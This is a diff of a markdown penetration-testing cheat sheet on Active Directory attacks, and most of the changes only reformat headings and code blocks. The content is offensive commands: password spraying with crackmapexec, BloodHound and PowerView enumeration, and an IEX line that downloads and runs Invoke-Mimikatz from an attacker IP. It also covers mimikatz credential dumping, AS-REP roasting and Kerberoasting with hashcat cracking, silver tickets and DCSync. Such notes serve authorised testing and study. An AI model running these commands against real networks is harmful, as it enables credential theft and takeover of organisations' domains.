@@ -1253,7 +1253,7 @@ unsetg
 ```
 
 
-****Active Directory Information and Enumeration:****
+**Active Directory Information and Enumeration:**
 
 ```
 xfreerdp /u:Administrator /d:domain.local /v:10.0.0.174 /p:Password1#
@@ -1264,9 +1264,8 @@ net group "Domain Admins" /domain
 
 impacket-GetADUsers corp.com/stephanie:"Password6" -all -dc-ip 192.168.180.70
 ```
+**Using PowerView.ps1**
 ```
-Using PowerView.ps1
-
 Import-Module .\PowerView.ps1
 
 Get-NetDomain
@@ -1310,9 +1309,8 @@ Find-DomainShare           (-CheckShareAccess shows only accessible shares)
 ls \\DC01.corp.com\sysvol\corp.com\
 ```
 
+**Automated Active Directory Enumeration:**
 ```
-Automated Active Directory Enumeration:
-
 1. Ingestion with SharpHound.ps1
 
 - Import-Module .\SharpHound.ps1
@@ -1338,9 +1336,8 @@ bloodhound
 		- MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ```
 
+**Enumerating Active Directory with Credentials:**
 ```
-Enumerating Active Directory with Credentials:
-
 net accounts /domain               (grab the lockout policy in effect)
 
 crackmapexec smb 192.168.55.44 -u users.txt -p test123 -d domain.local --continue-on-success
@@ -1358,8 +1355,8 @@ https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
 	- usernames.lst has to be ANSI encoded (Notepad > Save As)
 ```
 
+**Exploiting Active Directory Authentication**
 ```
-Exploiting Active Directory Authentication
 **NTLM is used when servers are addressed via IP or unregistered hostname
 **Kerberos is used when servers are addressed via registered hostname
 
@@ -1370,9 +1367,9 @@ IEX(New-Object Net.Webclient).downloadstring("http://<attacker-IP/Invoke-Mimikat
 	- sekurlsa::logonpasswords
 	- sekurlsa::tickets
 	- crpyto::capi or crypto::cng      (patch functions to export private keys)
-
+```
 1. AS-REP Roasting:         (accounts w/ no Kerberos pre-authentication)
-
+```
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 	- use GenericAll/GenericWrite to disable Kerberos pre-authentication
 From Linux:
@@ -1390,10 +1387,9 @@ From Windows:
 .\Rubeus.exe asreproast /nowrap
 
 sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-
+```
 2. Kerberoasting:          (attacking user accounts associated with an SPN)
-
+```
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/UnIqUeVaLuE123'} -verbose
 
 	- use GenericAll/GenericWrite to give an account an SPN and make them kerberoastable
@@ -1409,10 +1405,9 @@ From Linux:
 sudo impacket-GetUserSPNs -request -dc-ip <DC-IP> domain.local/<valid-username>:"Password1"
 
 sudo hashcat -m 13100 hashes.kerber /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-
+```
 3. Silver Tickets:             (service account password/hash and SPN)
-
+```
 From Windows:
 
 .\mimikatz.exe
@@ -1434,10 +1429,9 @@ klist
 iwr -UseDefaultCredentials http://web04.corp.com -OutFile test.html
 
 - accessing a web server with a cached ticket
-
-
+```
 4. DCSync:                  (local Admin on a domain joined machine)
-
+```
 From Windows:
 
 .\mimikatz.exe
